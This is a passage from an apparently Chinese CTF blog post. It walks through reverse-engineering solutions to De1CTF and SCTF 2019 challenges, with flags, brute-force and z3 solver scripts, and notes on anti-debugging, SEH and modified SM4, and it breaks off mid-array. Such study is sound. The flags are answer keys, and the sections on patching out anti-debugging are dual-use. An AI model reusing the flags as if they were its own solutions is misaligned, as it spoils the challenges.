title="Cplusplus"></a>Cplusplus</h2><p>hint里面有md5很明显这又是一道多解题<br>总共4次check<br>中间有time反调试<br>第一次check是sub_140005910<br>主要是检查是否是数字+@+数字+#+数字<br>第二次是sub_1400029B0<br>判断第一段数字是否合格<br>首先会有个大小判断<br><img src="4.png" alt="4"><br>判断是否大于111大于就gg<br>然后下面是根据输入的一个判断<br>因为懒。。。这边我直接爆破<br>也就111次，最后发现应该输入为78<br>多解就出现在这边。。。可以输入078，78，0078啥的<br>然后就是下面的check，很简单就是比较下标而已<br><img src="5.png" alt="5"><br>这边的反调试被我patch掉了<br>第二段数字应该是20637<br>然后就是第三段<br>if ( WORD2(v51) % (unsigned int)(unsigned __int16)v51 != 12 &amp;&amp; WORD2(v51) / (unsigned int)(unsigned __int16)v51 != 3 )<br>这边就是第三段的check<br>z3写一下完事<br>发现应该是114<br>所以flag<br>de1ctf{78@20637#114}</p><h2 id="Evil-boost"><a href="#Evil-boost" class="headerlink" title="Evil_boost"></a>Evil_boost</h2><p>沙雕题<br>中间还放了假flag<br>是个算24点<br>输入限制为5数字一小写字母，小写字母放在第二个必须是e//这个是在某个代码段中看到的，但是不是e也能过，可以说十分沙雕<br>还有5填充符可以用/()-*<br>这时候就能猜测是不是再算什么东西了。。。<br>最后猜到了24点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">import</span> string<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crackMd5</span>(<span class="hljs-params">dst</span>):</span><br>    dst = dst.lower()<br><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>                    <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><br>                        word = <span class="hljs-string">&#x27;de1ctf&#123;&#x27;</span> + <span class="hljs-built_in">str</span>(a) + <span class="hljs-string">&#x27;e&#x27;</span> + <span class="hljs-built_in">str</span>(b) + <span class="hljs-string">&#x27;*(&#x27;</span> + <span class="hljs-built_in">str</span>(c) + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-built_in">str</span>(d) + <span class="hljs-string">&#x27;/&#x27;</span> + <span class="hljs-built_in">str</span>(e) + <span class="hljs-string">&#x27;)&#125;&#x27;</span><br><br>                        tmp = hashlib.md5(word).hexdigest()<br><br>                        <span class="hljs-keyword">if</span> dst == tmp:<br>                            <span class="hljs-keyword">return</span> word<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    raw_input(crackMd5(<span class="hljs-string">&quot;293316bfd246fa84e566d7999df88e79&quot;</span>))<br></code></pre></td></tr></table></figure><p>最后还是靠着爆破写出来的</p><h2 id="Signal-vm"><a href="#Signal-vm" class="headerlink" title="Signal vm"></a>Signal vm</h2><p>学长写的，写完后复现了发我<br>发现就是个矩阵求解问题</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># -*- coding: UTF-<span class="hljs-number">8</span> -*-<br>from z3 import *<br>a = [<span class="hljs-number">65</span>, <span class="hljs-number">108</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">32</span>, <span class="hljs-number">104</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">101</span>, <span class="hljs-number">110</span>, <span class="hljs-number">32</span>, <span class="hljs-number">119</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">32</span>, <span class="hljs-number">118</span>, <span class="hljs-number">105</span>, <span class="hljs-number">114</span>, <span class="hljs-number">103</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">97</span>, <span class="hljs-number">44</span>, <span class="hljs-number">32</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">101</span>, <span class="hljs-number">32</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">100</span>, <span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">32</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">115</span>, <span class="hljs-number">0</span>]<br>b = [<span class="hljs-number">0xD6</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0x86</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x26</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xCE</span>,<br>  <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xC8</span>,<br>  <span class="hljs-number">0x75</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xD8</span>,<br>  <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xF1</span>,<br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x51</span>]<br>s = Solver()<br>key = [BitVec(<span class="hljs-string">&#x27;u%d&#x27;</span>%i,<span class="hljs-number">8</span>) for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">70</span>)]<br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):<br>    for j <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):<br>        s<span class="hljs-number">.</span><span class="hljs-keyword">add</span>(b[i*<span class="hljs-number">7</span>+j] == key[i*<span class="hljs-number">7</span>]*a[j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">1</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">1</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">2</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">2</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">3</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">3</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">4</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">4</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">5</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">5</span>+j]+key[i*<span class="hljs-number">7</span>+<span class="hljs-number">6</span>]*a[<span class="hljs-number">7</span>*<span class="hljs-number">6</span>+j])<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">if s.check() == sat:</span><br><span class="hljs-string">    result = s.model()</span><br><span class="hljs-string">    for i in range(70):</span><br><span class="hljs-string">        flag += chr(result[key[i]].as_long().real)</span><br><span class="hljs-string">    print flag</span><br></code></pre></td></tr></table></figure><h1 id="sctf-2019"><a href="#sctf-2019" class="headerlink" title="sctf 2019"></a>sctf 2019</h1><p>sctf因为在考试周所以没打。。。<br>//导致现在xctf联赛要凉了<br>抽时间把题目搞一搞<br>还好当时保存下来了</p><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>这题当时没写出来是吧关键的函数给直接patch了。。。<br><img src="13.png" alt="13"><br>前俩个函数，涉及了最后匹配的密文修改，我以为是反调试直接给patch了<br>然后gg<br><img src="14.png" alt="14"><br>后面就是一个aes cbc模式直接解密就完事了<br>这边学习一波seh异常处理<br>debugbreak没有在调试下的话会抛出异常，然后seh跳过去<br>如果在调试状态下的话就会继续运行。。。<br>//类似反调试了<br><img src="15.png" alt="15"><br>跳过去后就是一些smc操作<br>nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=<br>aes解得<br>sctf{Ae3_C8c_I28_pKcs79ad4}</p><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>我佛了<br>还有非预期。。。被我撞上了<br>首先就是去花，直接手去了,很简单的花而已这边不演示<br><img src="16.png" alt="16"><br>第一个问题是maze，输入sxss直接完事了。。。<br>后来看了wp发现居然不一样，十分蒙蔽。。。<br>//说到底还是tcl，没看出来这是立体迷宫<br>//但是后来又想了想还是觉得这迷宫出的有点hape<br>然后就是一个base64解码操作，函数也有花轻松去<br><img src="17.png" alt="17"><br>可以看到很明显的解码操作<br>直接把比较字符串加密就ok了<br>c2N0Zl85MTAy<br>然后最后也是我最烦的加密算法<br>看了wp发现是魔改sm4<br>当时看出来是sm4了，国赛的sm4我直接把密钥倒着输出的答案<br>//国赛那个后来知道是sm4，再看看这题的算法和国赛的是分相似，所以可以推断sm4<br>但是这个魔改的只看到一个box。。。瞬间懵逼。。。<br>//其实就是太懒了没仔细看，仔细看马上就知道怎么写<br>看了wp才写出来的<br>fl4g_is_s0_ug1y!</p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>这边主要总结一下俩个<br>一个是涉及的seh，还有一个就是sm4逆向</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TEB-Thread-Environment-Block，线程环境块"><a href="#TEB-Thread-Environment-Block，线程环境块" class="headerlink" title="TEB(Thread Environment Block，线程环境块)"></a>TEB(Thread Environment Block，线程环境块)</h3><p>先了解一下前置只是tep线程管理<br>就是一个存放线程信息的一个结构体<br>每个线程维护着自己的一个TEB，且可以通过FS寄存器直接根据offset提取信息，很是方便。</p><h3 id="TIB-Thread-Information-Block，线程信息块"><a href="#TIB-Thread-Information-Block，线程信息块" class="headerlink" title="TIB(Thread Information Block，线程信息块)"></a>TIB(Thread Information Block，线程信息块)</h3><p>offset为0<br>ExceptionList，即指向_EXCEPTION_REGISTRATION_RECORD结构的指针链表，和SEH相关，涉及到异常处理<br>stackBase，该线程的stack地址<br>stackLimit，该线程的stack的limit，实际上就是栈的结束位置<br>self，即指向TEB的指针，在程序中看到的fs:[0x18]也就是拿到了TEB</p><h3 id="ProcessEnvironmentBlock"><a href="#ProcessEnvironmentBlock" class="headerlink" title="ProcessEnvironmentBlock"></a>ProcessEnvironmentBlock</h3><p>指向的是PEB，在程序中常见的ptr fs:[0x30]也就是拿到了PEB的地址，因为现在的windows已经有了地址随机化的功能，所以基本上都是用这种方式来拿到PEB的</p><h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>这个就很熟悉了，毕竟和反调试有点关系<br>当我们找到了TEB时实际上我们也就找到了PEB（Thread Environment Block，线程环境块）<br>通过FS:[0x30]我们就可以轻松的拿到PEB的地址<br>实际上PEB是一个进程内核对象，在没有开启随机化的情况下，它的地址在32位上就是0x7ffd7000，很明显是一个用户空间的可访问数据，当为了能在具体运行环境下拿到他的地址还是FS:[0x30]更为保险，当然也可以通过EPROCESS来访问，不过一是EPROCESS位于内核空间，访问需要Ring0权限，二来和要讨论的LDR调试也没关系，所以这里就不提了</p><h3 id="BeingDebugged-amp-amp-NtGlobalFlag"><a href="#BeingDebugged-amp-amp-NtGlobalFlag" class="headerlink" title="BeingDebugged &amp;&amp;NtGlobalFlag"></a>BeingDebugged &amp;&amp;NtGlobalFlag</h3><p>前面记录过这个<br>是用来判断我们是否处于调试状态的<br>win32有个API叫做IsDebuggerPresent<br>就是通过拿到它来判断程序是不是处于被调试状态的<br>你可以用它来实现最最简单的反调试，下面就是函数的源码：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">IsDebuggerPresent(VOID)<br>&#123;<br>    <span class="hljs-keyword">return</span> NtCurrentPeb<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>BeingDebugged;<br>&#125;<br></code></pre></td></tr></table></figure><p>那你可能又会想了，为什么这么简单，如果我们在调试过程中手动修改内存不就可以绕过了吗？<br>其实没那么简单，<br>BeingDebufgged被设置为了true会导致一系列的“连锁反应”<br>首先是NtGlobalFlag修改<br>然后就是RtlCreateHeap会调用RtlDebugCreateHeap创建调试堆<br>这里面有很多0xbaadf00d前面讲过</p><h2 id="SEH异常处理"><a href="#SEH异常处理" class="headerlink" title="SEH异常处理"></a>SEH异常处理</h2><p>首先什么是异常？<br>异常就是对于非预期状况的处理<br>当我们运行某个程序出现了异常状况，就会进入异常处理流程<br>发现异常 -&gt; 寻找处理异常的方法 -&gt; 恢复执行或者发生错误<br>其中异常还分为软件异常和硬件异常，硬件异常有涉及中断，系统调用等行为</p><h3 id="硬件异常"><a href="#硬件异常" class="headerlink" title="硬件异常"></a>硬件异常</h3><p>硬件异常主要分为三种</p><h4 id="fault"><a href="#fault" class="headerlink" title="fault"></a>fault</h4><p>在处理此类异常时，操作系统会将遭遇异常时的“现场”保存下来（比如EIP、CS等寄存器的值），然后将调用相应的异常处理函数，如果对异常的处理成功了（没成功的情况会在下文中提到），那就恢复到原始现场，继续执行。最经典的fault例子莫过于Page Fault了，在分页机制下，当我们读到某个还未载入到内存的页时，就会触发该异常，操作系统会将该页载入内存，然后重新执行读取该页的指令，这是分页机制实现的重要机制。</p><h4 id="trap"><a href="#trap" class="headerlink" title="trap"></a>trap</h4><p>在处理此类异常时，操作系统会将异常的“下文”保存，在处理异常后，直接执行导致异常的指令的下一条指令。我们在调试过程中常用的断点操作就是基于这类异常的，当我们在某处下断点时调试器会将原本此处的指令对应的十六进制保存下来，然后替换第一个字节替换为0xCC的，也就是int 3，造成断点异常，中断（此处的中断用的是break，而我们一般说的中断是interrupt，请读者务必区分清楚）到调试器，程序在运行到此处就会停止等待下一步的指令，而当我们继续执行时调试器就会将该指令替换为原来的指令，程序也就恢复正常执行了。不知道大家有没有注意过，在进行程序调试时经常会看见hex界面显示大量的“烫烫烫”，这其实是0xcc对应的中文字符，因为这些地址的内容程序并不想让我们访问，一旦我们访问这些地址，就会读到0xcc，程序也就“中断”了。</p><h4 id="abort"><a href="#abort" class="headerlink" title="abort"></a>abort</h4><p>中止异常，主要是处理严重的硬件错误等，这类异常不会恢复执行，会强制性退出。<br>在windows系统中，硬件异常和中断被不加区分的存放在了一个向量表中，也就是我们常说的IDT（interruption descriptor table）<br>真正的IDT实际上是维护了多个门描述符（GD），每一项大小为8（64位为16），IDRT寄存器中保存着IDT的基地址，我们想具体找某个GD的话直接利用IDTR+8*offset即可。<br>GD大致由segment selector（段选择子）、offset（选定段后的偏移）、DPL（描述符特权级）、P（段是否存在）组成<br>当windows系统启动时，winLoad会在实模式下分配一块内存，使用CLI指令来禁止中断的使用，利用LIDT（Load IDT）指令将IDT表的位置和长度等信息交给CPU，接着系统恢复保护模式，这时的执行权交还给了入口函数，调用SIDT（set IDT）拿到之前存储的IDT的信息，并将其记录到PCR中，接着其他处理器也会进行初始化的操作，复制并修改自己的IDT，在一切准备就绪后，调用STL指令恢复中断的使用。调用的函数链如下：<br>winLoad -&gt; kiSystemStartup -&gt; kiInitializePcr -&gt;keStartAllProcessors -&gt; kiInitProcessors</p><h3 id="软件异常"><a href="#软件异常" class="headerlink" title="软件异常"></a>软件异常</h3><p>软件异常是由操作系统或应用程序产生的，它又包含了windows为我们定义好的异常处理和我们自己写的异常处理（各种编程语言中的try-catch结构）。<br>这类异常追根溯源都是基于RaiseException这个用户态API和NtRaiseException的内核服务建立起来的。<br>RaiseException的函数原型：<br>void RaiseException(DWORD dwExceptionCode , DWORD dwExceptionFlags,DWORD nNumberofArguments,const DWORD* lpArguments);</p><h3 id="异常的的分发处理"><a href="#异常的的分发处理" class="headerlink" title="异常的的分发处理"></a>异常的的分发处理</h3><h4 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h4><p>内核态的就略过了，因为一般ctf钟都是与user相关<br>user的异常处理就类似我们平常编程中的try catch<br>在调试下会判断是否给调试器处理异常</p><h2 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h2><p>。。。。。。<br>看了半天的书硬是没看懂<br>都看蒙蔽了<br>和当年看pe文件结构一个样<br>参考加密与解密 and 简书某dalao<br>功能<br>SEH实际包含两个主要功能：结束处理（termination handling）和异常处理（exception handling)<br>每当你建立一个try块，它必须跟随一个finally块或一个except块。<br>一个try块之后不能既有finally块又有except块。但可以在try-except块中嵌套try-finally块，反过来 也可以。<br>__try,__finally关键字用来标出结束处理程序两段代码的轮廓<br>不管保护体（try块） 是如何退出的。不论你在保护体中使用return，还是goto，或者是longjump，结束处理程序 （finally块）都将被调用。<br>在try使用__leave关键字会引起跳转到try块的结尾<br>TIB结构:在用户模式下，TIB(ThreadInformationBlock)位于TEB的头部。而TEB是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的TEB。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">nt!_TEB<br>   +<span class="hljs-number">0</span>x000 NtTib            : _<span class="hljs-type">NT_TIB</span><br>   +<span class="hljs-number">0</span>x01c EnvironmentPointer : <span class="hljs-type">Ptr32</span> Void<br></code></pre></td></tr></table></figure><p>下面是TIB结构</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust">typedef <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_NT_TIB</span></span>          <span class="hljs-comment">//sizeof  1ch</span><br>&#123;<br> <span class="hljs-number">00</span>h   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_EXCEPTION_REGISTRATION</span></span>  *ExceptionList;          <span class="hljs-comment">//SEH链入口</span><br> <span class="hljs-number">04</span>h   PVOID                            StackBase;              <span class="hljs-comment">//堆栈基址</span><br> <span class="hljs-number">08</span>h   PVOID                            StackLimit;             <span class="hljs-comment">//堆栈大小</span><br> <span class="hljs-number">0</span>ch   PVOID                            SubSystemTib;<br>       <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>           PVOID                FiberData;<br> <span class="hljs-number">10</span>h       DWORD                Version;<br>       &#125;;<br> <span class="hljs-number">14</span>h   PVOID                            ArbitraryUserPointer;<br> <span class="hljs-number">18</span>h   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_NT_TIB</span></span>                   *<span class="hljs-keyword">Self</span>;                  <span class="hljs-comment">//本NT_TIB结构自身的线性地址</span><br>&#125;NT_TIB;<br></code></pre></td></tr></table></figure><p>所以流程图一般是这样的</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+---------+    +----------------+      +---------------+<br>|<span class="hljs-string"> 发生异常 +---&gt;+   TIB          +-----&gt;+   Next        +--+</span><br>|<span class="hljs-string">         </span>|<span class="hljs-string">    </span>|<span class="hljs-string">   fs:[0]       </span>|<span class="hljs-string">      +---------------+  </span>|<span class="hljs-string">            +------------------+</span><br><span class="hljs-string">+---------+    +----------------+      </span>|<span class="hljs-string">   Handler     +--------------&gt;+  异常处理函数     </span>|<br>                                       +---------------+  |<span class="hljs-string">            </span>|<span class="hljs-string">  ...             </span>|<br>                                                          |<span class="hljs-string">            </span>|<span class="hljs-string">  retn            </span>|<br>                                               +----------+            +------------------+<br>                                               |<br><span class="hljs-string">                                       +-------v-------+</span><br><span class="hljs-string">                                       </span>|<span class="hljs-string">   Next        +--+</span><br><span class="hljs-string">                                       +---------------+  </span>|<span class="hljs-string">            +------------------+</span><br><span class="hljs-string">                                       </span>|<span class="hljs-string">   Handler     +--------------&gt;+  异常处理函数     </span>|<br>                                       +---------------+  |<span class="hljs-string">            </span>|<span class="hljs-string">  ...             </span>|<br>                                                          |<span class="hljs-string">            </span>|<span class="hljs-string">  retn            </span>|<br>                                               +----------+            +------------------+<br>                                               |<br><span class="hljs-string">                                       +-------v-------+</span><br><span class="hljs-string">                                       </span>|<span class="hljs-string">  FFFFFFh      </span>|<br>                                       +---------------+               +------------------+<br>                                       |<span class="hljs-string">   Handler     +--------------&gt;+  异常处理函数     </span>|<br>                                       +---------------+               |<span class="hljs-string">  ...             </span>|<br>                                                                       |<span class="hljs-string">  retn            </span>|<br>                                                                       +------------------+<br></code></pre></td></tr></table></figure><p>next是下一个链的地址。如果next的值是FFFFFFh,表示是链表的最后一个节点，该节点的回调函数是系统设置的一个终结处理函数，所有无人值守的异常都会到达这里。<br>异常处理函数可以是自定义的函数，系统有一个默认的函数，但我们可以自定义一个异常处理函数，让它来处理。<br>示例代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exception_memory_access_violation</span><span class="hljs-params">(LPEXCEPTION_POINTERS p_exinfo)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (p_exinfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)<br>&#123;<br><span class="hljs-keyword">return</span>  EXCEPTION_EXECUTE_HANDLER; <span class="hljs-comment">//handle this exception</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH; <span class="hljs-comment">//Do not handle this exception</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span>* mem = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Hello World!\n&quot;</span>;<br>__try &#123;<br>*mem = <span class="hljs-number">0</span>; <span class="hljs-comment">//throw exception</span><br>&#125;<br>__except (exception_memory_access_violation(GetExceptionInformation()))  <span class="hljs-comment">//handler</span><br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Memory error in except&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逆向分析<br><img src="18.png" alt="18"><br>果然ida没反编译出来。。。<br>ida貌似不能反编译try catch这种异常处理<br>但是看汇编流程图还是能看到<br><img src="19.png" alt="19"><br>函数一开始就把seh结构体push进去了<br>在结构体那边的地址断点就ok了<br>//具体是怎么样还不是很清楚。。。<br>//这个坑以后再好好填<br>//第一次遇到，下次写题一定要认出来啊</p><h3 id="魔改sm4"><a href="#魔改sm4" class="headerlink" title="魔改sm4"></a>魔改sm4</h3><p>这个魔改的其实写起来特别简单<br>由前四输入推出第五个，然后不断循环<br>解密只需要用后四推出前面就行了<br>本来想用骚操作patch来写。但是失败了不知道为啥</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">#define <span class="hljs-keyword">ROL</span>(x, r)  (((x) &lt;&lt; (r)) | ((x) &gt;&gt; (<span class="hljs-number">32</span> - (r))))<br>#define <span class="hljs-keyword">ROR</span>(x, r)  (((x) &gt;&gt; (r)) | ((x) &lt;&lt; (<span class="hljs-number">32</span> - (r))))<br>unsigned char v3[<span class="hljs-number">288</span>]=&#123;<span class="hljs-number">0x0D6</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x0E9</span>, <span class="hljs-number">0x0FE</span>, <span class="hljs-number">0x0CC</span>, <span class="hljs-number">0x0E1</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x0B7</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x0B6</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x0C2</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x0FB</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x76</span>, <span 